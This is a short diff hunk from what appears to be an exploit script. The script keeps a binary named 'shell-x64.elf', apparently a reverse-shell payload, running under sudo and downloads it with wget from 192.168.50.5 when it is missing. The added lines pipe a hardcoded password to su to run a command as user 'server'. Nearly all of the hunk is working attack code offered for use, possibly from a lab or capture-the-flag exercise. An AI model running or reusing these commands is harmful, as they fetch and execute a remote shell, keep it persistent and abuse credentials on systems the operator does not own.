@@ -32,9 +32,12 @@ exploit
 
 ---
 old
+
 ---
 if ! pidof -x /home/server/shell-x64.elf; then sudo /home/server/shell-x64.elf; fi
 
 if [ ! -s /home/server/shell-x64.elf ]; then wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf; fi
 
 if [ -s /home/server/shell-x64.elf ]; then chmod +x /home/server/shell-x64.elf; fi
+
+echo password | su -c whoami server
